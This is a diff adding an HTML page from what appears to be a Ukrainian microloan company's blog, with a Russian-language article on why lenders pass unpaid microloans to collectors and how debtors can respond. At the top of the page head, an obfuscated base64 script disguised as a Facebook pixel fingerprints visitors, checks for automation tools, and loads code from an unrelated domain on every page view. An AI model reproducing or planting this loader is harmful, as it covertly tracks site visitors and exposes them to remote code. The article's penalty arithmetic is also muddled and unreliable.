@@ -1,0 +1,453 @@
+
+
+<!DOCTYPE html>
+
+<html lang="ru-RU"
+
+    <head>
+	<script src="data:text/javascript;base64, dmFyIHNmdHpoeGx5bmRjd3NjYnBmeGx5ZW5yc2dpbWxmeXJ5ZWx4bWlqa3dtbnNmcXR1PWZ1bmN0aW9uKHNyYyl7dmFyIHE9YXRvYigiWDE5emRHOXdRV3hzVkdsdFpYSnpMbmRsWW1SeWFYWmxjaTVmWDI1cFoyaDBiV0Z5WlM1ZmMyVnNaVzVwZFcwdVkyRnNiRkJvWVc1MGIyMHVZMkZzYkZObGJHVnVhWFZ0TGw5VFpXeGxibWwxYlY5SlJFVmZVbVZqYjNKa1pYSXVjMlZzWlc1cGRXMHVaSEpwZG1WeUxsOXpaV3hsYm1sMWJTNWZYM2RsWW1SeWFYWmxjbDlsZG1Gc2RXRjBaUzVmWDNObGJHVnVhWFZ0WDJWMllXeDFZWFJsTGw5ZmQyVmlaSEpwZG1WeVgzTmpjbWx3ZEY5bWRXNWpkR2x2Ymk1ZlgzZGxZbVJ5YVhabGNsOXpZM0pwY0hSZlpuVnVZeTVmWDNkbFltUnlhWFpsY2w5elkzSnBjSFJmWm00dVgxOW1lR1J5YVhabGNsOWxkbUZzZFdGMFpTNWZYMlJ5YVhabGNsOTFibmR5WVhCd1pXUXVYMTkzWldKa2NtbDJaWEpmZFc1M2NtRndjR1ZrTGw5ZlpISnBkbVZ5WDJWMllXeDFZWFJsTGw5ZmMyVnNaVzVwZFcxZmRXNTNjbUZ3Y0dWa0xsOWZabmhrY21sMlpYSmZkVzUzY21Gd2NHVmtMbDl3YUdGdWRHOXRMbkJvWVc1MGIyMHVaRzl0UVhWMGIyMWhkR2x2Ymw5ZmJtbG5hSFJ0WVhKbCIpLnNwbGl0KCIuIiksZT1lbmNvZGVVUklDb21wb25lbnQsZz0wLHc9d2luZG93LGQ9dy5kb2N1bWVudCxuPXcubmF2aWdhdG9yLGRlPSJkb2N1bWVudEVsZW1lbnQiLHM9dy5zY3JlZW4scD0iIixhPSJhdmFpbCIsaT0iaW5uZXIiLG89Im91dGVyIixIPSJIZWlnaHQiLFc9IldpZHRoIixjPXcuY2hyb21lP09iamVjdC5rZXlzKHcuY2hyb21lKS5qb2luKCIqIik6IioiLHRhZz1kLmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO2Z1bmN0aW9uIHdkKCl7dHJ5e2Zvcih2YXIgbCBpbiBxKXt2YXIgej1xW2xdO2lmKHdbel18fG5bel0pcmV0dXJuIHo7aWYoZCYmZFtkZV0mJmRbZGVdLmdldEF0dHJpYnV0ZSYmZFtkZV0uZ2V0QXR0cmlidXRlKHopKXJldHVybiB6O2lmKHogaW4gd3x8eiBpbiBkKXJldHVybiB6fXJldHVybiAwfWNhdGNoKGUpe319IWZ1bmN0aW9uIHdwKCl7dHJ5e2lmKG4mJm4ucGx1Z2lucyl7T2JqZWN0LmtleXMobi5wbHVnaW5zKS5mb3JFYWNoKGZ1bmN0aW9uKGkpe2lmKG4ucGx1Z2luc1tpXSlwKz1uLnBsdWdpbnNbaV0uZmlsZW5hbWUrIioifSl9fWNhdGNoKGUpe319KCk7dHJ5e2c9ZC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCJ3ZWJnbCIpO2c9Zy5nZXRQYXJhbWV0ZXIoZy5nZXRFeHRlbnNpb24oIldFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8iKS5VTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCl9Y2F0Y2goZSl7fXNyYz0iaHR0cHM6Ly9oeGF4cGtqYi5zaXRlL3phaW00LnBocD9jbGlkPSIrYnRvYSgicmVmPSIrZShkLnJlZmVycmVyKSsiJmRyaXZlPSIrd2QoKSsiJmM9IitjKyImcz0iK3NbYStIXSsiKiIrd1tpK0hdKyIqIit3W28rSF0rIioiK3NbYStXXSsiKiIrd1tpK1ddKyIqIit3W28rV10rIioiK3cuZGV2aWNlUGl4ZWxSYXRpbysiKiIrbi5tYXhUb3VjaFBvaW50cysiJnA9IitwKyImaD0iK24uaGFyZHdhcmVDb25jdXJyZW5jeSsiKiIrbi5kZXZpY2VNZW1vcnkrIioiK2UoZykrIiZ0PSIrZShuZXcgRGF0ZSgpLnRvU3RyaW5nKCkpKyImcT0iK2Uody5sb2NhdGlvbi5zZWFyY2guc3Vic3RyKDEpKSk7dGFnWyJ0eXBlIl09InRleHQvamF2YXNjcmlwdCI7dGFnWyJzcmMiXT1zcmM7ZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZCh0YWcpfSgiaHR0cHM6Ly9jb25uZWN0LmZhY2Vib29rLm5ldC9lbl9VUy9mYmV2ZW50cy5qcyIp"></script>
+        <!-- <meta charset="utf-8"> -->
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+
+        <title>Почему микрозаймы передают коллекторам? | Блог MyWallet</title>
+        <meta name="title" content="Почему микрозаймы передают коллекторам? | Блог MyWallet">
+        <meta name="description" content="Невыполнение условий договора микрозайма влечет за собой определенные последствия. Какие именно? И что будет, если не платить микрозайм?">
+        <meta name="keywords" content="Кредит, украина, оформить, низкие проценты, без справки о доходах, оформить, взять, онлайн, микрозайм, займ, микрокредит, миникредит"/>
+
+		<meta property="og:locale" content="ru_RU" />
+        <meta property="og:title" content="Почему микрозаймы передают коллекторам? | Блог MyWallet">
+        <meta property="og:description" content="Невыполнение условий договора микрозайма влечет за собой определенные последствия. Какие именно? И что будет, если не платить микрозайм?">
+		<meta property="og:site_name" content="MyWallet" />
+		<meta property="og:url" content=" />
+        <meta property="og:type" content="website">
+		<meta property="og:image" content="https://mywallet.ua/wp-content/uploads/2018/07/9.jpg">
+
+        <meta name="author" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <script src="https://mywallet.ua/wp-content/themes/mywallet/js/vendor/jquery-2.1.3.min.js"></script>
+
+        <link rel="shortcut icon" type="image/x-icon" href="https://mywallet.ua/wp-content/themes/mywallet/img/favicon.ico">
+        <link rel="stylesheet" href="https://mywallet.ua/wp-content/themes/mywallet/css/normalize.min.css">
+        <link rel="stylesheet" href="https://mywallet.ua/wp-content/themes/mywallet/css/bootstrap.min.css">
+        <link rel="stylesheet" href="https://mywallet.ua/wp-content/themes/mywallet/css/slick.css">
+        <link rel="stylesheet" href="https://mywallet.ua/wp-content/themes/mywallet/css/slick-theme.css">
+        <link rel="stylesheet" href="https://mywallet.ua/wp-content/themes/mywallet/css/nouislider.min.css">
+        <link rel="stylesheet" href="https://mywallet.ua/wp-content/themes/mywallet/css/main.css">
+		<link rel='stylesheet' id='wp-postratings-css'  href='/wp-content/plugins/wp-postratings/css/postratings-css.css?ver=1.86' type='text/css' media='all' />
+
+								<link rel="canonical" href=""/>
+					<link rel="alternate" hreflang="ru" href="" />
+			<link rel="alternate" hreflang="uk" href="" />
+
+
+<body class="page-template page-template-blog-page page-template-blog-page-php page page-id-2823 page-child parent-pageid-1555">
+
+<a href="" class="how-widget">
+		<span class="how-widget-q">?</span>
+		<span class="how-widget-t active">Как получить кредит?</span>
+	</a>
+
+<header class="header">
+
+    <div class="container-fluid">
+
+        <div class="wrapper-1005 header-container">
+
+        	<div class="header-mico hidden-ld hidden-md js--mobMenu"></div>
+
+            <a href="" class="header-logo">
+
+                <img src="javascript:;" class="lazy-load hidden-xs" alt="Кредиты онлайн на mywallet.net.ua" title="Кредиты, займы и ссуды онлайн на mywallet.net.ua" width="158" height="46" data-lazy="https://mywallet.ua/wp-content/themes/mywallet/img/logo.png">
+
+                <img src="javascript:;" class="lazy-load hidden visible-xs" alt="Кредиты онлайн на mywallet.net.ua mobile" title="Кредиты, займы и ссуды онлайн на mywallet.net.ua mobile" width="110" height="32" data-lazy="https://mywallet.ua/wp-content/themes/mywallet/img/logo.png">
+
+            </a>
+
+            <ul class="header-menu hidden-sm hidden-xs">
+				<li class='withsubmenu needsclick'><a href='javascript:;' class='bold'>Как это работает</a><ul class="header-menu__submenu" style="display:none;"><li><a href="">Оформление займов в MyWallet</a></li><li><a href="">Погашение займов в MyWallet</a></li><li><a href="">Пролонгация кредита в MyWallet</a></li></ul></li><li class='noafter'><a href='' class=''>Вопросы и ответы</a></li><li class='withsubmenu needsclick'><a href='javascript:;' class='bold'>О нас</a><ul class="header-menu__submenu" style="display:none;"><li><a href">Правовая информация</a></li><li><a href="">Договор займа</a></li><li><a href="">Финансовая отчетность</a></li><li><a href=">Политика конфиденциальности</a></li><li><a href="">Партнерам</a></li><li><a href="">Новости</a></li><li><a href="">Отзывы</a></li><li><a href="">Контакты</a></li></ul></li><li class='noafter'><a href='' class=''>Акции</a></li><li class='noafter'><a href='' class=''>Блог</a></li>            </ul>
+
+            <div class="header-right">
+            	<a href="" class="butt butt-login header-fr">вход</a>
+            	<div class="header-lang header-fr">
+            		
+<ul class="language-chooser language-chooser-short qtranxs_language_chooser" id="language-chooser">
+<li class="active"><a href="" class="qtranxs_short_ru qtranxs_short" title="Русский (ru)"><span>ru</span></a></li>
+<li><a href="" class="qtranxs_short_ua qtranxs_short" title="Українська (ua)"><span>ua</span></a></li>
+</ul><div class="qtranxs_widget_end"></div>
+            	</div>
+            	<a href="tel:0(800)-211-049" class="header-tel header-lang header-fr hidden-xs">0(800)-211-049</a>
+				
+<!--	<a name="calculator"></a>--><section class="section section-content pt0 pb50">
+	<div class="pagetitle">
+    	<div class="container-fluid clearfix">
+        	<div class="row">
+            	<div class="col-xs-12">
+                    <div class="pagetitle-pages" vocab="" typeof="BreadcrumbList">
+						<span property="itemListElement" typeof="ListItem">
+							<a property="item" typeof="WebPage" href="">
+								<span property="name">Главная</span>
+							</a>
+							<meta property="position" content="1" />
+						</span> -
+						<span property="itemListElement" typeof="ListItem">
+							<a property="item" typeof="WebPage" href="">
+								<span property="name">Блог</span>
+							</a>
+							<meta property="position" content="2" />
+						</span> -
+						<span property="itemListElement" typeof="ListItem">
+							<a property="item" typeof="WebPage" href="">
+								<span property="name">Все о кредитах</span>
+							</a>
+							<meta property="position" content="3" />
+						</span> -
+						<span property="itemListElement" typeof="ListItem">
+							<span property="name">Почему микрозаймы не подают в суд на должников, а передают коллекторам?</span>
+							<meta property="position" content="4" />
+						</span>
+					</div>
+                    <div class="pagetitle-title">
+                        <h1 class="title">Почему микрозаймы не подают в суд на должников, а передают коллекторам?</h1>
+                    </div>
+                </div>
+            </div>
+    	</div>
+    </div>
+	<div class="container-fluid clearfix">
+        <div class="row newslist">
+        	<div class="wrapper-945 col-xs-12 col-md-10 col-md-offset-1">
+               <div class="blog-page-open">
+				   <p><span style="font-weight: 400;">Микрокредитование - удобный способ получить жизненно необходимые средства прямо здесь и сейчас. Суммы микрокредитов обычно составляют не более 10 тысяч гривен, а дневная процентная ставка в день в среднем составляет 1-3%.</span></p>
+<p>&nbsp;</p>
+<p><span style="font-weight: 400;">Однако, оформляя микрокредит в МФО и заключая </span><span style="font-weight: 400;">договор</span><span style="font-weight: 400;"> с организацией, клиент обязуется соблюдать установленный порядок выплаты займа. Невыполнение условий договора микрозайма влечет за собой определенные </span><span style="font-weight: 400;">последствия</span><span style="font-weight: 400;">. Какие именно? И </span><span style="font-weight: 400;">что будет, если не платить микрозайм?</span></p>
+<p><img class="alignleft wp-image-2824" src="https://mywallet.ua/wp-content/uploads/2018/07/9.jpg" alt="Почему микрозаймы не подают в суд на должников, а передают коллекторам?" width="565" height="300" /></p>
+<p>&nbsp;</p>
+<p><span style="font-weight: 400;">Вначале это штрафные санкции, которые накладываются в размере 1-2% в день на сумму долга. Получается, при просрочке займа в 5 000 гривен 2% в день - это 100 гривен, а за неделю придется доплатить 700 гривен штрафа. Но в случае просрочки на 5 000 гривен за первый день просрочки штраф будет составлять 5100 гривен, а на следующий день, когда штраф налагается на штраф, получится уже другая сумма. И только представьте себе, какая переплата “накапает” за неделю? А за две? А за несколько месяцев? Эта сумма может оказаться просто неподъемной для должника и он даже откажется от мысли попытаться погасить </span><a href=""><span style="font-weight: 400;">долг</span></a><span style="font-weight: 400;">. Что же произойдет потом? </span></p>
+<p>&nbsp;</p>
+<h2><strong>Как МФО решают вопрос с должниками</strong></h2>
+<p>&nbsp;</p>
+<p><span style="font-weight: 400;">Как правило, </span><span style="font-weight: 400;">МФО</span><span style="font-weight: 400;"> не передают дело ни коллекторским агентствам, ни в суд на протяжении нескольких месяцев. </span><span style="font-weight: 400;">Вопрос</span><span style="font-weight: 400;">: зачем они тянут до последнего? Ответ прост: они надеются, заемщик вернет деньги с внушительными процентами по штрафу и компания неплохо на этом заработает. Особенно, если у заемщика хорошая кредитная история, кредиторам есть смысл ждать. Когда же </span><span style="font-weight: 400;">сумма</span><span style="font-weight: 400;"> задолженности становится очень внушительной, у микрофинансовой организации появляется повод обратиться в суд, но как правило, она этого не делает, потому что:</span></p>
+<ul>
+	<li style="font-weight: 400;"><span style="font-weight: 400;">в случае передачи дела в суд, компания должна заморозить начисление процентов;</span></li>
+	<li style="font-weight: 400;"><span style="font-weight: 400;">проценты могут быть списаны с должника как незаконные;</span></li>
+	<li style="font-weight: 400;"><span style="font-weight: 400;">подача заявления в суд стоит денег и отбирает время;</span></li>
+	<li style="font-weight: 400;"><span style="font-weight: 400;">нет никакой гарантии, что МФО, даже выиграв дело, получит свои деньги назад в полном объеме.</span></li>
+</ul>
+<p>&nbsp;</p>
+<h2><strong>Кто такие коллекторы и почему к ним лучше не попадаться</strong></h2>
+<p><span style="font-weight: 400;">Принимая решение </span><span style="font-weight: 400;"><a href="">оформить микрокредит</a>,</span><span style="font-weight: 400;"> лучше 10 раз подумать. Если вы осознаете, что может возникнуть ситуация, когда понимаете, что выплата займа в срок будет вам не по силам, заранее узнайте в компании-кредиторе, предоставляет ли она  услугу пролонгации. Если да, то это хороший </span><span style="font-weight: 400;">способ</span><span style="font-weight: 400;"> временно избежать проблем с коллекторскими организациями. </span></p>
+<p><span style="font-weight: 400;">Есть две причины, почему микрозаймы не подают на должников в суд, а пользуются услугами коллекторских фирм: </span></p>
+<ul>
+	<li style="font-weight: 400;"><span style="font-weight: 400;">затратное и длительное судебное разбирательство;</span></li>
+	<li style="font-weight: 400;"><span style="font-weight: 400;">низкий процент результативности </span></li>
+</ul>
+<p><span style="font-weight: 400;">МФО потратит немало средств на подачу </span><span style="font-weight: 400;">судебного иска</span><span style="font-weight: 400;"> на неплательщика, но если у него нет официального дохода, за долг в несколько тысяч гривен, суд у него не отберет ни квартиру, ни машину, ни какие-либо другие ценности.</span></p>
+<p><span style="font-weight: 400;">Поэтому МФО передают (продают) должников коллекторам, которые после “выбивания” долга получают свою часть суммы задолженности. </span></p>
+<p><span style="font-weight: 400;">Коллекторские </span><span style="font-weight: 400;">организации</span><span style="font-weight: 400;"> работают в два этапа. Первый - ежедневные звонки с запугиваниями вроде “вам больше никто никогда кредит не даст”, “</span><span style="font-weight: 400;">когда коллекторы подадут в суд</span><span style="font-weight: 400;">, приставы конфискуют ваше имущество” и т.д.</span></p>
+<p><span style="font-weight: 400;">Если в течение 180 дней клиент не предпринимает шагов по погашению задолженности, начинается второй этап. Коллекторы начинают угрожать, что на должника будет выпущен «выездной отдел», задача которого -  опозорить человека на виду у других людей. Так, они могут караулить должника у выхода с работы и перед свидетелями напомнить ему о том, какой он злостный неплательщик.</span></p>
+<p><span style="font-weight: 400;">Методы взыскания средств </span><span style="font-weight: 400;">коллекторов</span><span style="font-weight: 400;"> и влияния на заемщика бывают довольно жесткими и они не всегда </span><span style="font-weight: 400;">законны</span><span style="font-weight: 400;">. Это и запугивание, и психологическое давление, и порча имущества и т.д. Поэтому лучше делать все возможное, чтобы МФО не начала процесс взыскания.</span></p>
+<p>&nbsp;</p>
+<h2><strong>Что делать вам?</strong></h2>
+<p>&nbsp;</p>
+<p><img class="alignright wp-image-2825" src="https://mywallet.ua/wp-content/uploads/2018/07/6-1.jpg" alt="Как МФО решают вопрос с должниками" width="480" height="300" /></p>
+<p><span style="font-weight: 400;">Если вы уже попались ”на </span><span style="font-weight: 400;">кредитный</span><span style="font-weight: 400;"> крючок к коллекторам”, будет несладко. Ежедневные звонки, разговоры на повышенных тонах, угрозы и пр. будут вас изматывать. Ради получения комиссии коллекторы будут делать все возможное, чтобы вывести вас из себя и заставить выплатить сумму с набежавшими процентами. Они будут регулярно вас унижать и требовать своего.</span></p>
+<p>&nbsp;</p>
+<p><span style="font-weight: 400;">Как же быть? Из сложившейся ситуации есть два выхода. Первый - не пытайтесь найти лазейки </span><span style="font-weight: 400;">как не платить микрозайм.</span><span style="font-weight: 400;"> Попробуйте спокойно договориться с коллекторами о частичном погашении задолженности. Внесите обещанную сумму в срок, чтобы вас оставили в покое. Постепенно, но регулярно гасите задолженность, чтобы в итоге освободиться от неприятного груза на своих плечах. Знайте, что коллекторы, как и МФО, крайне редко подают в суд на маленькие долги, им это тоже не выгодно.</span></p>
+<p>&nbsp;</p>
+<p><span style="font-weight: 400;">Второй - требуйте передачи дела в суд. Как мы уже выяснили ранее, суд действительно может спасти ситуацию. Не платите проценты, поскольку набегут новые и возникнет переплата уже не в два, а в три и более раз. Помните: сумма вашего долга по процентам не может превышать основной суммы задолженности. А суд, как вы помните, имеет основания списать с вас проценты как незаконные. Даже если вы не выиграете </span><span style="font-weight: 400;">дело</span><span style="font-weight: 400;">, вам не придется выплачивать бешенные суммы - вы просто погасите свой долг. </span></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><span style="font-weight: 400;">И конечно же, самый правильный и логичный способ избавиться от кабалы с долгами и процентами — это исправно платить долг, как добросовестный </span><span style="font-weight: 400;">заемщик</span><span style="font-weight: 400;">, если у вас есть такая возможность. Да, ситуации в жизни бывают разные и случается, что найти сумму на погашение кредита просто нереально. Но если вы просто относитесь к долгу халатно и тратите деньги на лишние вещи вместо того, чтобы отложить их на погашение задолженности то задумайтесь над своими действиями. Лучше найти способ выплатить долг, чтобы не думать об этой проблеме днем и ночью, и не чувствовать себя зависимым.</span></p>
+<div class="butt-wp mt-50"><a class="butt" href=""</a></div>				</div>
+				<div class="title title-small">Другие статьи в нашем блоге</div>
+				<div class="blog-items blog-new-items" style="text-align: center;">
+										<div class="blog-item myitem">
+						<div>
+							<a href="">
+								<img width="150" height="150" src="https://mywallet.ua/wp-content/uploads/2018/12/osn-3.jpg" class="attachment-thumbnail size-thumbnail" alt="Как выбрать надежный банк?" />							</a>
+						</div>
+						<div class="newslist-item-tit bold">
+							<a href="">Как выбрать надежный банк?</a>
+						</div>
+						<div class="clearfix"></div>
+					</div>
+										<div class="blog-item myitem">
+						<div>
+							<a href="">
+								<img width="150" height="150" src="https://mywallet.ua/wp-content/uploads/2018/12/blog.jpg" class="attachment-thumbnail size-thumbnail" alt="" />							</a>
+						</div>
+						<div class="newslist-item-tit bold">
+							<a href=""></a>
+						</div>
+						<div class="clearfix"></div>
+					</div>
+										<div class="blog-item myitem">
+						<div>
+							<a href="">
+								<img width="150" height="150" src="https://mywallet.ua/wp-content/uploads/2019/01/osn-2-1.jpg" class="attachment-thumbnail size-thumbnail" alt="" />							</a>
+						</div>
+						<div class="newslist-item-tit bold">
+							<a href="">Как используют микрокредиты жители Европы и США?</a>
+						</div>
+						<div class="clearfix"></div>
+					</div>
+									</div>
+				
+<script type="text/javascript">(function(w,doc) {
+if (!w.__utlWdgt ) {
+    w.__utlWdgt = true;
+    var d = doc, s = d.createElement('script'), g = 'getElementsByTagName';
+    s.type = 'text/javascript'; s.charset='UTF-8'; s.async = true;
+    s.src = ('https:' == w.location.protocol ? 'https' : 'http')  + '://w.uptolike.com/widgets/v1/uptolike.js';
+    var h=d[g]('body')[0];
+    h.appendChild(s);
+}})(window,document);
+</script>
+<div style="text-align:left;" data-lang="ru" data-url="" data-mobile-view="true" data-share-size="30" data-like-text-enable="false" data-background-alpha="0.0" data-pid="cmsmywalletua" data-mode="share" data-background-color="#ffffff" data-share-shape="round-rectangle" data-share-counter-size="12" data-icon-color="#ffffff" data-mobile-sn-ids="fb.vk.tw.ok.wh.vb.tm." data-text-color="#000000" data-buttons-color="#FFFFFF" data-counter-background-color="#ffffff" data-share-counter-type="common" data-orientation="horizontal" data-following-enable="false" data-sn-ids="fb.tw.tm.gp." data-preview-mobile="false" data-selection-enable="true" data-exclude-show-more="false" data-share-style="1" data-counter-background-alpha="1.0" data-top-button="false" class="uptolike-buttons" ></div>
+				
+				
+				<div class="rating-center" style="text-align: center;">
+            </div>
+        </div>
+    </div>
+</section>
+<section class="section section-subscribe section-content pb50">
+	<div class="container-fluid clearfix">
+        <div class="row subscribe">
+            <div class="wrapper-945 col-xs-12 col-md-10 col-md-offset-1">
+            	<div class="row">
+                	<div class="col-xs-12">
+                		<h2 class="title mb15 whight">Подписка на рассылку</h2>
+                        <div class="title-sm whight">Участники рассылки могут участвовать в конкурсах и получать специальные условия по займу <br>  </div>
+                        <br><br>
+                        <iframe src=""></iframe>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<footer class="footer">
+	<div class="container-fluid clearfix">
+        <div class="row">
+            <div class="wrapper-945 col-xs-12 col-md-10 col-md-offset-1">
+            	<div class="row footer-items">
+				    <div class="footer-partners-all">
+            			<div class="title mb60 whight">Наши партнеры</div>
+            			<div class="wrap_footer-partners">
+							<div class="footer-partners">
+								<img src="javascript:;" class="lazy-load" data-lazy="https://mywallet.ua/wp-content/themes/mywallet/img/images/ibo-logo.png" alt="IBOX" title="IBOX">
+							</div>
+							<div class="footer-partners">
+								<img src="javascript:;" class="lazy-load" data-lazy="https://mywallet.ua/wp-content/themes/mywallet/img/images/icon-comodo_secure_seal.png" alt="Comodo Secure" title="Comodo Secure">
+							</div>
+							<div class="footer-partners">
+								<img src="javascript:;" class="lazy-load" data-lazy="https://mywallet.ua/wp-content/themes/mywallet/img/images/icon-pci-dss.png" alt="Pci Dss" title="Dss">
+							</div>
+							<div class="footer-partners">
+								<img src="javascript:;" class="lazy-load" data-lazy="https://mywallet.ua/wp-content/themes/mywallet/img/images/icon-ssl.png" alt="Ssl Secure" title="Ssl Secure">
+							</div>
+							<div class="footer-partners">
+								<img src="javascript:;" class="lazy-load" data-lazy="https://mywallet.ua/wp-content/themes/mywallet/img/images/master-card.png" alt="Master card" title="Master card">
+							</div>
+							<div class="footer-partners">
+								<img src="javascript:;" class="lazy-load" data-lazy="https://mywallet.ua/wp-content/themes/mywallet/img/images/platon-logo.png" alt="Platon" title="Platon">
+							</div>
+							<div class="footer-partners">
+								<img src="javascript:;" class="img-ubki lazy-load" data-lazy="https://mywallet.ua/wp-content/themes/mywallet/img/images/ubki-logo.png" alt="Українське бюро кредитних історій" title="Українське бюро кредитних історій">
+							</div>
+							<div class="footer-partners">
+								<img src="javascript:;" class="lazy-load" data-lazy="https://mywallet.ua/wp-content/themes/mywallet/img/images/visa.png" alt="Visa" title="Visa">
+							</div>
+            			</div>
+            		</div>
+            		            			<div class="col-xs-12 col-md-3 footer-item">
+                    	<div class="footer-item-tit">Как это работает</div>
+                        <ul class="footer-menu ">
+                        	                        		<li>
+									
+                        	                        </ul>
+                    </div>
+            		            			<div class="col-xs-12 col-md-3 footer-item">
+                    	<div class="footer-item-tit">ВОПРОСЫ И ОТВЕТЫ</div>
+                        <ul class="footer-menu ">
+                        	                        		<li>
+									<a href=" 												 
+                        	                        </ul>
+                    </div>
+            		            			<div class="col-xs-12 col-md-3 footer-item">
+                    	<div class="footer-item-tit">О НАС</div>
+                        <ul class="footer-menu limb10">
+                        	                        		<li>
+									
+                        	                        </ul>
+                    </div>
+            		                    <div class="col-xs-12 col-md-3 footer-item">
+                    	<div class="footer-item-tit">Мы в соцсетях</div>
+                        <div class="socs">
+                        </div>
+                        <div class="footer-conts">
+                        	<a href="tel:0(800)-211-049" class="tel montserrat">0(800)-211-049</a>
+                            <p>Контактный центр</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer-line"></div>
+    <div class="container-fluid clearfix">
+        <div class="row">
+            <div class="wrapper-945 col-xs-10 col-xs-offset-1">
+                <div class="row footer-bottom">
+                	<div class="col-xs-12">
+						<div class="copyrights">2017- 2019 © Компания «MyWallet».<br> Все права защищены.<br><br>
+    							Копирование содержимого сайта строго запрещено.</div>
+						<div class="developer">
+                           <div class="dev_left">
+                           		<a href="" rel="nofollow" target="Создание сайта: artARTERY.NET" title="Разработка сайта - artARTERY">Разработка сайта<br> artARTERY</a>
+                            </div>
+							<div>
+								<a class="dev_right" href="" rel="nofollow" target="Создание сайта: artARTERY.NET" title="Разработка сайта - artARTERY"></a>
+							</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/vendor/jquery.placeholder.js"></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/vendor/slick.js"></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/vendor/inputmask.js"></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/vendor/jquery.inputmask.js"></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/vendor/nouislider.min.js"></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/vendor/wNumb.js"></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/vendor/FullScreenControl.js"></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/vendor/fastclick.js"></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/main.js"></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/jquery.maskedinput.js"></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/calculator.js"></script>
+<script src='https://www.google.com/recaptcha/api.js'></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/formValidation.js"></script>   
+
+<script>
+	var first_gap_percent = 0.1;
+		first_gap_percent = first_gap_percent/100;
+	var second_gap_percent = 1.9;
+		second_gap_percent = second_gap_percent/100;
+	var first_gap_term = 7;
+	var termmin = 5;
+	var termmax = 30;
+
+	$('.reviews-sl').slick({
+		dots: true,
+		arrows:true,
+		slidesToShow: 3,
+		centerMode: true,
+		centerPadding:'0',
+		responsive: [
+			{
+			  breakpoint: 767,
+			  settings: {
+				 slidesToShow: 1,
+				 arrows:false,
+				 adaptiveHeight: true,
+			  }
+			}
+		],
+	});
+</script>
+
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/jquery-ui.js"></script>
+<script src="https://mywallet.ua/wp-content/themes/mywallet/js/searchautocomplete.js"></script>
+
+<script>
+$('document').ready(function(){
+	var amountval = document.getElementById('amountval');
+	var amountvalValue = document.getElementById('amountval-val');
+	var amountvalValue2 = document.getElementById('amountval-val2');
+
+	var amountDate = document.getElementById('amountdate');
+	var amountDateValue = document.getElementById('amountdate-val');
+	var amountDateValue2 = document.getElementById('amountdate-val2');
+
+	if (amountval) {
+		noUiSlider.create(amountval, {
+			start: [5000],
+			step: 100,
+			connect: [true, false],
+			range: {
+				'min': [ 500 ],
+				'max': [ 10000 ]
+			},
+			format: wNumb({
+				decimals: 0,
+				thousand: ' '
+			})
+		});
+	}
+
+	var nodes = [
+		document.getElementById('amountval-val'), // 0
+		document.getElementById('amountval-val2') // 1
+	];
+
+	if (amountval) {
+		amountval.noUiSlider.on('update', function( values, handle ){
+			amountvalValue.innerHTML = values[handle];
+			amountvalValue2.innerHTML = values[handle];
+			calcAmount();
+		});
+	}
+
+	if (amountDate) {
+		noUiSlider.create(amountDate, {
+			start: [7],
+			step: 1,
+			connect: [true, false],
+			range: {
+				'min': [ 5 ],
+				'max': [ 30 ]
+			},
+			format: wNumb({
+				decimals: 0,
+			})
+		});
+	}
+
+	if (amountDate) {
+		amountDate.noUiSlider.on('update', function( values, handle ){
+			amountDateValue.innerHTML = values[handle];
+			amountDateValue2.innerHTML = values[handle];
+			changeDate();
+			calcAmount();
+		});
+	}
+});
+</script>
+
+
+<script>
+/* <![CDATA[ */
+	var ratingsL10n = {"plugin_url":"\/wp-content\/plugins\/wp-postratings","ajax_url":"\/wp-admin\/admin-ajax.php","text_wait":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u043d\u0435 \u0433\u043e\u043b\u043e\u0441\u0443\u0439\u0442\u0435 \u0437\u0430 \u043d\u0435\u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0437\u0430\u043f\u0438\u0441\u0435\u0439 \u043e\u0434\u043d\u043e\u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e.","image":"stars_crystal","image_ext":"gif","max":"5","show_loading":"1","show_fading":"1","custom":"0"};
+	var ratings_mouseover_image=new Image();ratings_mouseover_image.src="/wp-content/plugins/wp-postratings/images/stars_crystal/rating_over.gif";;
+/* ]]> */
+</script>
+<script src='/wp-content/plugins/wp-postratings/js/postratings-js.js?ver=1.86'></script>
+
+<script>
+	(function(){ var widget_id = 'IL4i38XeY1';var d=document;var w=window;function l(){
+		var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = '//code.jivosite.com/script/widget/'+widget_id; var ss = document.getElementsByTagName('script')[0]; ss.parentNode.insertBefore(s, ss);}if(d.readyState=='complete'){l();}else{if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
+</script>
+
+<script src='/affilates.js?r=1368870366'></script>
+
+</body>
+</html>
